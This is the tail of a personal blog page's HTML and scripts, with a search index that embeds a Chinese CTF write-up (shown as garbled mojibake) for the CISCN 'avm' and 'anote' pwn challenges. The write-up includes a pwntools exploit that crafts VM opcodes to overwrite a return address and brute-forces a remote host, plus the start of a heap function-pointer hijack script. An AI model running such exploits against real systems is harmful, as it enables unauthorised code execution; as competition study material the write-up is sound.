			let chooseLive2d = 'rem'
			if (chooseLive2d === 'histoire') {
				AIimgSrc.push(message_Path + "model/histoire/histoire.1024/texture_00.png");
				AIimgSrc.push(message_Path + "model/histoire/histoire.1024/texture_01.png");
				AIimgSrc.push(message_Path + "model/histoire/histoire.1024/texture_02.png");
				AIimgSrc.push(message_Path + "model/histoire/histoire.1024/texture_03.png");
			} else if (chooseLive2d === 'rem') {
				AIimgSrc.push(message_Path + "model/rem/remu2048/texture_00.png");
			} else if (chooseLive2d === 'aoba') {
				AIimgSrc.push(message_Path + "model/aoba/textures/texture_00.png");
			} else if (chooseLive2d === 'hijiki') {
				AIimgSrc.push(message_Path + "model/hijiki/moc/hijiki.2048/texture_00.png");
			} else if (chooseLive2d === 'tororo') {
				AIimgSrc.push(message_Path + "model/tororo/moc/tororo.2048/texture_00.png");
			}
			var images = [];
			var imgLength = AIimgSrc.length;
			var loadingNum = 0;
			for (var i = 0; i < imgLength; i++) {
				images[i] = new Image();
				images[i].src = AIimgSrc[i];
				images[i].onload = function () {
					loadingNum++;
					if (loadingNum === imgLength) {
						var live2dhidden = localStorage.getItem("live2dhidden");
						if (live2dhidden === "0") {
							setTimeout(function () {
								$('#open_live2d').fadeIn(200);
							}, 1300);
						} else {
							setTimeout(function () {
								$('#landlord').fadeIn(200);
							}, 1300);
						}
						let model = '';
						if (chooseLive2d === 'histoire') {
							model = message_Path + "model/histoire/model.json";
						} else if (chooseLive2d === 'rem') {
							model = message_Path + "model/rem/model.json";
						} else if (chooseLive2d === 'aoba') {
							model = message_Path + "model/aoba/model.json";
						} else if (chooseLive2d === 'hijiki') {
							model = message_Path + "model/hijiki/hijiki.model.json";
						} else if (chooseLive2d === 'tororo') {
							model = message_Path + "model/tororo/tororo.model.json";
						}
						setTimeout(function () {
							loadlive2d("live2d", model);
						}, 1000);
						initLive2d();
						images = null;
					}
				}
			}
		});
	}
</script>
                      
                        
</div>
<script>
  let sideBarOpen = "sidebar-open";
  let body = document.body;
  let back2Top = document.querySelector("#back_to_top"),
    back2TopText = document.querySelector("#back_to_top_text"),
    drawerBox = document.querySelector("#drawer_box"),
    rightSideBar = document.querySelector(".sidebar"),
    viewport = document.querySelector("body");

  function scrollAnimation(currentY, targetY) {
    let needScrollTop = targetY - currentY;
    let _currentY = currentY;
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10);
      _currentY += dist;
      window.scrollTo(_currentY, currentY);
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY);
      } else {
        window.scrollTo(_currentY, targetY);
      }
    }, 1);
  }

  back2Top.addEventListener("click", function (e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });

  window.addEventListener("scroll", function (e) {
    let percent =
      (document.scrollingElement.scrollTop /
        (document.scrollingElement.scrollHeight -
          document.scrollingElement.clientHeight)) *
      100;
    if (percent > 1 && !back2Top.classList.contains("back-top-active")) {
      back2Top.classList.add("back-top-active");
    }
    if (percent == 0) {
      back2Top.classList.remove("back-top-active");
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });

  let hasCacu = false;
  window.addEventListener("resize", function (e) {
    calcuHeight();
  });

  function calcuHeight() {
    // åŠ¨æ€è°ƒæ•´ç«™ç‚¹æ¦‚è§ˆé«˜åº¦
    if (
      (!hasCacu && back2Top.classList.contains("pisces")) ||
      back2Top.classList.contains("gemini")
    ) {
      let sideBar = document.querySelector(".sidebar");
      let navUl = document.querySelector("#site_nav");
      sideBar.style =
        "margin-top:" + (navUl.offsetHeight + navUl.offsetTop + 15) + "px;";
      hasCacu = true;
    }
  }
  calcuHeight();

  let open = false,
    MOTION_TIME = 300,
    RIGHT_MOVE_DIS = "320px";

  if (drawerBox) {
    let rightMotions = document.querySelectorAll(".right-motion");
    let right = drawerBox.classList.contains("right");

    let transitionDir = right
      ? "transition.slideRightIn"
      : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS,
      };
      closeProp = {
        paddingRight: "0px",
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS,
      };
      closeProp = {
        paddingLeft: "0px",
      };
    }

    drawerBox.onclick = function () {
      open = !open;
      jQuery.Velocity(rightSideBar, "stop");
      jQuery.Velocity(viewport, "stop");
      jQuery.Velocity(rightMotions, "stop");
      if (open) {
        jQuery.Velocity(
          rightSideBar,
          {
            width: RIGHT_MOVE_DIS,
          },
          {
            duration: MOTION_TIME,
            begin: function () {
              jQuery.Velocity(rightMotions, transitionDir, {});
            },
          }
        );
        jQuery.Velocity(viewport, openProp, {
          duration: MOTION_TIME,
        });
      } else {
        jQuery.Velocity(
          rightSideBar,
          {
            width: "0px",
          },
          {
            duration: MOTION_TIME,
            begin: function () {
              jQuery.Velocity(rightMotions, {
                opacity: 0,
              });
            },
          }
        );
        jQuery.Velocity(viewport, closeProp, {
          duration: MOTION_TIME,
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle("muse-line");
      }
      drawerBox.classList.toggle(sideBarOpen);
    };
  }

  // é“¾æ¥è·³è½¬
  let newWindow = "false";
  if (newWindow === "true") {
    let links = document.querySelectorAll(".post-body a");
    links.forEach((item) => {
      if (!item.classList.contains("btn")) {
        item.setAttribute("target", "_blank");
      }
    });
  }

  let faSearch = document.querySelector("#fa_search");
  faSearch &&
    faSearch.addEventListener("click", function () {
      document.querySelector("#search_mask").style = "";
    });

  // ä»£ç é«˜äº®
  hljs.initHighlightingOnLoad();

  // ç¦»å¼€å½“å‰é¡µtitleå˜åŒ–
  var leaveTitle = "";
  var normal_title = document.title;
  if (leaveTitle) {
    document.addEventListener("visibilitychange", function () {
      if (document.visibilityState == "hidden") {
        normal_title = document.title;
        document.title = leaveTitle;
      } else {
        document.title = normal_title;
      }
    });
  }
</script>

<link rel="stylesheet" href="/media/css/jquery.fancybox.css" />
<script src="/media/js/jquery.fancybox.js"></script>

<script>
  let images = document.querySelectorAll(".section img");
  images.forEach((image) => {
    var parent = image.parentElement;
    var next = image.nextElementSibling;
    parent.removeChild(image);
    var aelem = document.createElement("a");
    aelem.href = image.src;
    aelem.dataset["fancybox"] = "images";
    aelem.dataset["rel"] = "fancybox-button";
    aelem.classList.add("fancybox");
    aelem.appendChild(image);
    parent.insertBefore(aelem, next);
  });
</script>
    <div class="reward-mask" style="display: none;">
  <div class="reward-relative">
    <span class="close" aria-hidden="true">x</span>
    <div class="reward-body">
      <h2>æ„Ÿè°¢æ‚¨çš„æ”¯æŒï¼Œæˆ‘ä¼šç»§ç»­åŠªåŠ›çš„!</h2>
      <div class="reward-img-box">
        <div style="position: relative; width: 140px; height: 140px;">
          
          
          
        </div>
      </div>
      <p class="reward-word">æ‰«ç æ‰“èµï¼Œä½ è¯´å¤šå°‘å°±å¤šå°‘</p>
      <p class="reward-tip"> </p>
    </div>
    <div class="bottom">
      
      
    </div>
  </div>
</div>
<style>
  .reward-mask {
    position: fixed;
    z-index: 99999;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    background-color: #00000054;
  }

  .reward-relative {
    position: relative;
    width: 480px;
    text-align: center;
    margin: 0 auto;
    border-radius: 5px;
    background-color: #fff;
    top: 50%;
    margin-top: -205px;
  }

  .reward-relative .close {
    position: absolute;
    right: 10px;
    font-weight: normal;
    font-size: 16px;
    color: #929292;
  }

  .reward-body {
    padding: 40px 20px 20px;
  }

  .bottom {
    display: flex;
  }

  .reward-btn {
    text-align: center;
  }

  .reward-btn-text {
    display: inline-block;
    cursor: pointer;
    width: 60px;
    height: 60px;
    line-height: 60px;
    border-radius: 50%;
    background-color: #ff9734;
    color: #FFF;
    margin-top: 20px;
  }

  .pay-text {
    margin-top: 10px;
    padding: 10px;
    flex: 1;
    transition: all .2s linear;
  }

  .pay-text:hover {
    background-color: #a5a5a536;
  }

  .reward-body h2 {
    padding-top: 10px;
    text-align: center;
    color: #a3a3a3;
    font-size: 16px;
    font-weight: normal;
    margin: 0 0 20px;
  }

  .reward-body h2:after,
  .reward-body h2:before {
    font-family: Arial, Helvetica, sans-serif;
    background: 0 0;
    width: 0;
    height: 0;
    font-style: normal;
    color: #eee;
    font-size: 80px;
    position: absolute;
    top: 20px;
  }

  .reward-body h2:before {
    content: '\201c';
    left: 50px;
  }

  .reward-body h2:after {
    content: '\201d';
    right: 80px;
  }

  .reward-img-box {
    display: inline-block;
    padding: 10px;
    border: 6px solid #ea5f00;
    margin: 0 auto;
    border-radius: 3px;
    position: relative;
  }

  .reward-img {
    position: absolute;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
  }

  @media (max-width: 767px) {
    .reward-relative {
      height: 100%;
      top: 0px;
      margin-top: 0;
      width: auto;
    }

    .reward-relative .bottom {
      flex-direction: column;
    }

    .reward-relative .pay-text {
      width: 80%;
      margin: 5px auto;
      border: 1px solid silver;
      padding: 6px;
      border-radius: 4px;
    }

    .reward-body h2:after {
      right: 40px;
    }

    .reward-body h2:after,
    .reward-body h2:before {
      font-size: 60px;
    }

    .reward-body h2:before {
      left: 20px;
    }
  }
</style>
<script>
  !function () {
    var mask = document.querySelector('.reward-mask');
    let close = document.querySelector('.reward-relative .close');
    let rewardBtn = document.querySelector('.reward-btn');

    let zfb = document.querySelector('#zfb'),
      wx = document.querySelector('#wx'),
      zfbBtn = document.querySelector('#zfbBtn'),
      wxBtn = document.querySelector('#wxBtn');

    if (zfbBtn && wxBtn) {
      zfbBtn.addEventListener('click', () => {
        jQuery.Velocity(zfb, 'transition.slideLeftIn', {
          duration: 400
        });
        jQuery.Velocity(wx, 'transition.slideRightOut', {
          display: 'none',
          duration: 400
        });
      });

      wxBtn.addEventListener('click', () => {
        jQuery.Velocity(wx, 'transition.slideRightIn', {
          duration: 400
        });
        jQuery.Velocity(zfb, 'transition.slideLeftOut', {
          display: 'none',
          duration: 400
        });
      });
    }

    rewardBtn.addEventListener('click', (e) => {
      jQuery.Velocity(mask, 'transition.slideDownIn', {
        duration: 400
      })
    });

    close.addEventListener('click', (e) => {
      e.preventDefault();
      jQuery.Velocity(mask, 'transition.slideUpOut', {
        duration: 400
      })
    })
  }()
</script>

  </div>
</body>

  <div class="search-mask" id="search_mask" style="display: none;">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input id="search" type="text" class="language" data-lan="search" placeholder="æœç´¢">
      </div>
      <i id="close" class="fa fa-times-circle"></i>
    </div>
    <div class="stat-box">
      <span id="stat_count">0</span><span class="language" data-lan="stat">æ¡ç›¸å…³æ¡ç›®ï¼Œä½¿ç”¨äº†</span><span id="stat_times">0</span><span class="language" data-lan="stat-time">æ¯«ç§’</span>
      <hr>
    </div>
    <div class="result" id="result">
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/ciscn-ji-chang-cheng-bei/"" data-c="
          &lt;h1 id=&#34;avm&#34;&gt;avm&lt;/h1&gt;
&lt;p&gt;vmå®ç°äº†+ã€-ã€*ã€/ã€^ã€&amp;amp;ã€å·¦ç§»ã€å³ç§»ã€å°†æ ˆä¸Šçš„åœ°å€å†™ä¸€ä¸ªåˆ°bssä¸Šçš„qword_40C0ä¸Šã€å°†qword_40C0å†™ä¸€ä¸ªåˆ°æ ˆä¸Šçš„åœ°å€ï¼ŒæŒ¨ä¸ªè¿›è¡Œé€†å‘åˆ†æå‚æ•°å’ŒæŒ‡ä»¤è¯†åˆ«ç &lt;/p&gt;
&lt;h2 id=&#34;vmè¿è¡Œ&#34;&gt;vmè¿è¡Œ&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1734274709780.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å…¶ä¸­a1æ˜¯qword_40C0ï¼Œå…¶ä¸­a1[32]æ˜¯å½“å‰æŒ‡ä»¤ä½ç½®ï¼Œa1[33]æ˜¯opcodeé¦–åœ°å€ï¼Œa1[34]æ˜¯opcodeæœ€å¤§å­—èŠ‚æ•°å³0x300&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1734274843890.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å’Œ-4æŒ‰ä½ä¸ååªèƒ½æ˜¯4çš„å€æ•°ï¼Œä»¥å››ä¸ªå­—èŠ‚å–å‡ºopcodeååˆå³ç§»äº†28ä½ä½œä¸ºäº†è¯†åˆ«æŒ‡ä»¤çš„æ ‡è¯†ï¼Œå‡å¦‚å››ä¸ªå­—èŠ‚ä¸º&lt;code&gt;\x12\x34\x56\x78&lt;/code&gt;é‚£ä¹ˆä¹Ÿå°±æ˜¯0x78563412ï¼Œå³ç§»28ä½ä¹Ÿå°±æ˜¯7ï¼Œæ‰€ä»¥å°±æ­¤å¾—çŸ¥å¦‚ä½•æ§åˆ¶ç¨‹åºæ‰§è¡Œçš„å‡½æ•°&lt;/p&gt;
&lt;h2 id=&#34;åŠ &#34;&gt;åŠ &lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1734274357809.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åé¢å°±æ˜¯åŠ¨é™ç»“åˆçœ‹ä¸‹opcodeçš„ä½¿ç”¨&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  v2 = *(_DWORD *)(*(_QWORD *)(a1 + 0x108) + (*(_QWORD *)(a1 + 0x100) &amp;amp; 0xFFFFFFFFFFFFFFFCLL));
  *(_QWORD *)(a1 + 0x100) += 4LL;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¸¤è¡Œç”¨ä½œå–å‡ºå½“å‰çš„opcodeï¼Œå†æŒ‡å‘ä¸‹ä¸€ä¸ªopcode&lt;br&gt;
&lt;code&gt;(a1 + 8LL * (v2 &amp;amp; 0x1F)&lt;/code&gt;qword_40C0çš„ä¸‹æ ‡æ˜¯ç”±ç¬¬ä¸€ä¸ªå­—èŠ‚ä¹Ÿå°±æ˜¯\x12å†³å®šçš„ï¼Œ\x12æ˜¯å†™åˆ°qword_40C0ä¸‹æ ‡ä¸º12çš„åœ°æ–¹ï¼Œå¦‚æœæ˜¯\x22é‚£ä¹ˆä¸‹æ ‡å°±æ˜¯2ï¼Œç”±äºæ˜¯å’Œ0x1fæŒ‰ä½ä¸ï¼Œæ‰€ä»¥ä¸‹æ ‡å‰é¢æœ‰æ²¡æœ‰1å–å†³äºç¬¬ä¸€ä¸ªå­—èŠ‚ä¹Ÿå°±æ˜¯\x12é«˜4ä½æ˜¯å¦ä¸ºå¥‡æ•°&lt;br&gt;
&lt;code&gt;(a1 + 8LL * (HIWORD(v2) &amp;amp; 0x1F))&lt;/code&gt;ç¬¬ä¸€ä¸ªæ“ä½œæ•°ã€‚HIWORDå¯ä»¥å½“åšæ˜¯å§opcodeå‘å³ç§»ä¸¤ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯\x56ï¼Œå†å’Œ0x1fæŒ‰ä½ä¸ï¼Œé‚£ä¹ˆä¸‹æ ‡å°±æ˜¯16çš„ä½ç½®&lt;br&gt;
&lt;code&gt;(a1 + 8LL * ((v2 &amp;gt;&amp;gt; 5) &amp;amp; 0x1F))&lt;/code&gt;ç¬¬äºŒä¸ªæ“ä½œæ•°ã€‚æœ‰ä¸ªv2 &amp;gt;&amp;gt; 5å°±å’Œå‰ä¸¤ä¸ªå­—èŠ‚æœ‰å…³äº†ï¼Œå…·ä½“å¯ä»¥ç”¨è®¡ç®—å™¨ï¼Œå‡å¦‚å¦‚æœæƒ³ç”¨7åšä¸‹æ ‡ï¼Œé‚£ä¹ˆè®©7å·¦ç§»5ä½å¾—åˆ°0xe0ï¼Œé‚£ä¹ˆå°±éœ€è¦æ§åˆ¶å‰ä¸¤ä¸ªå­—èŠ‚ä¸º\xe?\x00æˆ–è€…\xf?\x00ï¼Œè¿™é‡Œ0xeæ˜¯å¶æ•°ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªæ“ä½œæ•°ä¸‹æ ‡å°±æ˜¯?ï¼Œ0xfæ˜¯å¥‡æ•°ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªæ“ä½œæ•°ä¸‹æ ‡æ˜¯1?&lt;/p&gt;
&lt;h2 id=&#34;å‰å…«ä¸ªæ“ä½œæ•°&#34;&gt;å‰å…«ä¸ªæ“ä½œæ•°&lt;/h2&gt;
&lt;p&gt;å‰å…«ä¸ªæ“ä½œæ•°éƒ½ç±»ä¼¼ï¼Œå’ŒåŠ æ³•ç±»æ¯”å³å¯&lt;/p&gt;
&lt;h2 id=&#34;ç¬¬ä¹ä¸ªç¬¬åä¸ªæ“ä½œæ•°-ä»¥åŠåˆ©ç”¨æ–¹å¼&#34;&gt;ç¬¬ä¹ä¸ªç¬¬åä¸ªæ“ä½œæ•° ä»¥åŠåˆ©ç”¨æ–¹å¼&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1734276255383.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åŠ¨æ€è°ƒè¯•å‘ç°æ­¤å¤„a2æ˜¯æ ˆä¸Šçš„åœ°å€ï¼Œè¯¥åŠŸèƒ½æ˜¯æŠŠqword_40C0ä¸Šçš„æ•°æ®å†™åˆ°æ ˆä¸ŠæŒ‡å®šçš„ä½ç½®&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1734276379794.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¯¥åŠŸèƒ½æ˜¯æŠŠæ ˆä¸ŠæŒ‡å®šçš„ä½ç½®çš„æ•°æ®å†™åˆ°qword_40C0ä¸Š&lt;br&gt;
ç¨‹åºæœ¬èº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¯ä»¥æ³„éœ²åœ°å€çš„åœ°æ–¹ï¼Œæ‰€ä»¥å°±åˆ©ç”¨æ–¹æ³•å°±å¯ä»¥çŒœå‡ºï¼Œå…ˆæŠŠæ ˆä¸Šçš„libcç›¸å…³åœ°å€å†™åˆ°qword_40C0ä¸Šï¼Œç„¶åå†é€šè¿‡åŠ å‡ä¹˜é™¤å·¦ç§»å³ç§»ç­‰æ–¹å¼æŠŠè¯¥åœ°å€æ”¹æˆogï¼Œç„¶åå†æŠŠæ ˆä¸Šçš„è¿”å›åœ°å€ä¿®æ”¹æˆogå³å¯ï¼Œä½†æ˜¯ç»è¿‡æ ˆä¸ŠæŸ¥æ‰¾ï¼Œå‘ç°æ²¡æœ‰ç¦»ogè¾ƒè¿‘çš„åœ°å€ï¼Œæ‰€ä»¥ç†è®ºä¸Šå°±éœ€è¦çˆ†ç ´ä¸€ä¸ªåŠå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯16&lt;em&gt;16&lt;/em&gt;16åˆ†ä¹‹ä¸€çš„æ¦‚ç‡ï¼Œä½†æ˜¯å®é™…ä¸Šå¾ˆå¥½çˆ†ï¼ˆï¼ˆï¼ˆï¼Œåé¢ä¸»è¦å°±æ˜¯æ„é€ ogçš„è¿‡ç¨‹äº†ï¼Œç”±äºçŠ¯äº†ä¸€äº›é€†å¤©æ“ä½œï¼Œå¯¼è‡´æ¯”èµ›æ²¡å‡ºæ¥ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­ï¼Œæ•´ä¸ªæŠ‘éƒä½äº†&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
# elf=ELF(&#39;./pwn&#39;)
# libc=elf.libc
# # p = remote(&#39;39.105.55.245&#39;, 24653)
# p=process(&#39;./pwn&#39;)

# #        cebd3f
# payload = b&#39;\x11\x22\xb8\xa6&#39;  #ä¼ å…¥libcåœ°å€
# payload += b&#39;\x10\x22\xc0\xa4&#39;  #ä¼ å…¥1
# payload += b&#39;\xa5\x20\x10\x14&#39;  #ä¼ å…¥1
# payload += b&#39;\x13\x22\x10\x14&#39;  #ç›¸åŠ å¾—å‡ºå³ç§»ä½æ•°24
# payload += b&#39;\x12\x22\x13\x14&#39; #ç•™å¥‡æ•°
# payload += b&#39;\x13\x22\x13\x14&#39;*22  #10 + 13 -&amp;gt;13
# payload += b&#39;\x10\x22\x11\x14&#39;
# payload += b&#39;\x11\x22\x13\x80&#39; #å³ç§»
# payload += b&#39;\x20\x22\x13\x70&#39; #å·¦ç§» 11å¤„
# payload += b&#39;\x63\x22\x13\x34&#39;  #ç›¸Ã—å¾—å‡ºpadding
# payload += b&#39;\x63\x22\x13\x34&#39;  #ç›¸Ã—å¾—å‡ºpadding
# payload += b&#39;\x62\x20\x13\x34&#39;  #ç›¸Ã—å¾—å‡ºpadding
# payload += b&#39;\x43\x20\x12\x34&#39;  #ç›¸xå¾—å‡ºpadding
# payload += b&#39;\x63\x20\x12\x34&#39;  #ç›¸Ã—å¾—å‡ºpadding
# payload += b&#39;\x64\x00\x12\x30&#39;  #ç›¸Ã—å¾—å‡ºpadding
# payload += b&#39;\x86\x00\x12\x30&#39;  #ç›¸Ã—å¾—å‡ºpadding
# payload += b&#39;\xc7\x00\x12\x30&#39;  #ç›¸Ã—å¾—å‡ºpadding
# payload += b&#39;\xe8\x00\x12\x30&#39;  #ç›¸Ã—å¾—å‡ºpadding
# payload += b&#39;\x09\x01\x06\x10&#39;  #ç›¸+å¾—å‡ºpadding
# payload += b&#39;\x2a\x01\x03\x10&#39;*2  #ç›¸+å¾—å‡ºpadding
# payload += b&#39;\x48\x01\x02\x10&#39;  #ç›¸+å¾—å‡ºpadding
# payload += b&#39;\x09\x01\x02\x10&#39;  #ç›¸+å¾—å‡ºpadding
# payload += b&#39;\x2a\x01\x02\x10&#39;  #ç›¸+å¾—å‡ºpadding
# payload += b&#39;\x4a\x01\x02\x10&#39;*7  #ç›¸+å¾—å‡ºpadding
# payload += b&#39;\x41\x02\x13\x30&#39;  #ç›¸Ã—å¾—å‡ºpadding
# payload += b&#39;\x4a\x01\x01\x20&#39;*0x75  #ç›¸-å¾—å‡ºpadding
# payload += b&#39;\x4a\x01\x13\x10&#39;  #ç›¸+å¾—å‡ºpadding
# payload += b&#39;\x4a\x01\x12\x10&#39;*5  #ç›¸+å¾—å‡ºpadding
# payload += b&#39;\xa7\x00\x05\x10&#39;  #ç›¸+å¾—å‡ºpadding
# payload += b&#39;\xeb\x00\x13\x70&#39; #å·¦ç§»
# payload += b&#39;\x6b\x01\x05\x80&#39; #å³ç§»
# payload += b&#39;\x6b\x01\x12\x80&#39; #å³ç§»
# payload += b&#39;\x4a\x01\x0b\x10&#39;  #ç›¸+å¾—å‡ºpadding
# payload += b&#39;\x51\x01\x00\x10&#39;  #ç›¸+å¾—å‡ºpadding
# payload += b&#39;\xd1\x22\x18\x91&#39; # 11æ˜¯å †å—ä¸­çš„ä¸‹æ ‡ \x18\x91 ä½ç½®åœ¨æ ˆä¸Š118ä¹Ÿå°±æ˜¯éœ€è¦ä¿®æ”¹çš„è¿”å›åœ°å€
# gdb.attach(p,&#39;b *$rebase(0x00000000000175D)&#39;)
# p.sendafter(&amp;quot;opcode: &amp;quot;,payload)
# p.sendafter(&#39;Unsupported instruction&#39;,&#39;cat flag&#39;)
# p.sendline(&#39;cat flag&#39;)

# p.interactive()

li = lambda x : print(&#39;\x1b[01;38;5;214m&#39; + str(x) + &#39;\x1b[0m&#39;)
ll = lambda x : print(&#39;\x1b[01;38;5;1m&#39; + str(x) + &#39;\x1b[0m&#39;)

rnd = 0
while True:
    try:
        p = remote(&#39;39.105.55.245&#39;, 24653)
        # p=process(&#39;./pwn&#39;)
        rnd += 1
        li(&#39;the &#39; + str(rnd) + &#39; round&#39;)
        
        payload = b&#39;\x11\x22\xb8\xa6&#39;  #ä¼ å…¥libcåœ°å€
        payload += b&#39;\x10\x22\xc0\xa4&#39;  #ä¼ å…¥1
        payload += b&#39;\xa5\x20\x10\x14&#39;  #ä¼ å…¥1
        payload += b&#39;\x13\x22\x10\x14&#39;  #ç›¸åŠ å¾—å‡ºå³ç§»ä½æ•°24
        payload += b&#39;\x12\x22\x13\x14&#39; #ç•™å¥‡æ•°
        payload += b&#39;\x13\x22\x13\x14&#39;*22  #10 + 13 -&amp;gt;13
        payload += b&#39;\x10\x22\x11\x14&#39;
        payload += b&#39;\x11\x22\x13\x80&#39; #å³ç§»
        payload += b&#39;\x20\x22\x13\x70&#39; #å·¦ç§» 11å¤„
        payload += b&#39;\x63\x22\x13\x34&#39;  #ç›¸Ã—å¾—å‡ºpadding
        payload += b&#39;\x63\x22\x13\x34&#39;  #ç›¸Ã—å¾—å‡ºpadding
        payload += b&#39;\x62\x20\x13\x34&#39;  #ç›¸Ã—å¾—å‡ºpadding
        payload += b&#39;\x43\x20\x12\x34&#39;  #ç›¸xå¾—å‡ºpadding
        payload += b&#39;\x63\x20\x12\x34&#39;  #ç›¸Ã—å¾—å‡ºpadding
        payload += b&#39;\x64\x00\x12\x30&#39;  #ç›¸Ã—å¾—å‡ºpadding
        payload += b&#39;\x86\x00\x12\x30&#39;  #ç›¸Ã—å¾—å‡ºpadding
        payload += b&#39;\xc7\x00\x12\x30&#39;  #ç›¸Ã—å¾—å‡ºpadding
        payload += b&#39;\xe8\x00\x12\x30&#39;  #ç›¸Ã—å¾—å‡ºpadding
        payload += b&#39;\x09\x01\x06\x10&#39;  #ç›¸+å¾—å‡ºpadding
        payload += b&#39;\x2a\x01\x03\x10&#39;*2  #ç›¸+å¾—å‡ºpadding
        payload += b&#39;\x48\x01\x02\x10&#39;  #ç›¸+å¾—å‡ºpadding
        payload += b&#39;\x09\x01\x02\x10&#39;  #ç›¸+å¾—å‡ºpadding
        payload += b&#39;\x2a\x01\x02\x10&#39;  #ç›¸+å¾—å‡ºpadding
        payload += b&#39;\x4a\x01\x02\x10&#39;*7  #ç›¸+å¾—å‡ºpadding
        payload += b&#39;\x41\x02\x13\x30&#39;  #ç›¸Ã—å¾—å‡ºpadding
        payload += b&#39;\x4a\x01\x01\x20&#39;*0x75  #ç›¸-å¾—å‡ºpadding
        payload += b&#39;\x4a\x01\x13\x10&#39;  #ç›¸+å¾—å‡ºpadding
        payload += b&#39;\x4a\x01\x12\x10&#39;*5  #ç›¸+å¾—å‡ºpadding
        payload += b&#39;\xa7\x00\x05\x10&#39;  #ç›¸+å¾—å‡ºpadding
        payload += b&#39;\xeb\x00\x13\x70&#39; #å·¦ç§»
        payload += b&#39;\x6b\x01\x05\x80&#39; #å³ç§»
        payload += b&#39;\x6b\x01\x12\x80&#39; #å³ç§»
        payload += b&#39;\x4a\x01\x0b\x10&#39;  #ç›¸+å¾—å‡ºpadding
        payload += b&#39;\x51\x01\x00\x10&#39;  #ç›¸+å¾—å‡ºpadding
        payload += b&#39;\xd1\x22\x18\x91&#39; # 11æ˜¯å †å—ä¸­çš„ä¸‹æ ‡ \x18\x91 ä½ç½®åœ¨æ ˆä¸Š118ä¹Ÿå°±æ˜¯éœ€è¦ä¿®æ”¹çš„è¿”å›åœ°å€
        p.sendafter(&amp;quot;opcode: &amp;quot;,payload)
        # p.sendafter(&#39;Unsupported instruction&#39;,&#39;cat flag&#39;)
        p.interactive()

    except EOFError:
        p.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;anote&#34;&gt;anote&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1734277338936.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å‘ç°&lt;code&gt;(**(void (__cdecl ***)(_DWORD))*(&amp;amp;v25 + v20))(*(&amp;amp;v25 + v20));&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;showåŠŸèƒ½ç»™å‡ºäº†å †å—åœ°å€&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1734277332950.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;å‘ç°æ¯æ¬¡editä¹‹åéƒ½ä¼šcallè¿™ä¸ªåœ°å€æŒ‡å‘çš„åœ°å€&lt;/p&gt;
&lt;p&gt;åŠ¨æ€è°ƒè¯•åå‘ç°åœ¨editå‰ä¸€ä¸ªå †å—æ—¶å¯ä»¥ä¿®æ”¹å½“å‰å †å—çš„è¯¥åœ°å€&lt;/p&gt;
&lt;p&gt;äº‹å…ˆåœ¨å †å—é‡Œå†™å…¥åé—¨åœ°å€ï¼Œç„¶ååœ¨è¿™ä¸ªåœ°å€å†™å…¥å­˜æ”¾åé—¨åœ°å€çš„å †å—åœ°å€å³å¯è°ƒç”¨åé—¨å‡½æ•°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;i386&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
elf=ELF(&#39;./note&#39;)
libc=elf.libc
#io=remote(&#39;47.94.216.142&#39;,32962)
io=process(&#39;./note&#39;)
 
def cmd(choice):
    io.recvuntil(b&amp;quot;Choice&amp;gt;&amp;gt;&amp;quot;)
    io.sendline(str(choice).encode())
 
def add() :
    cmd(1)
 
def show(idx):
    cmd(2)
    io.recvuntil(b&amp;quot;index: &amp;quot;)
    io.sendline(str(idx).encode())
 
def edit(idx,size,content=&#39;a&#39;) :
    cmd(3)
    io.recvuntil(b&amp;quot;index: &amp;quot;)
    io.sendline(str(idx).encode())
    io.recvuntil(b&amp;quot;len: &amp;quot;)
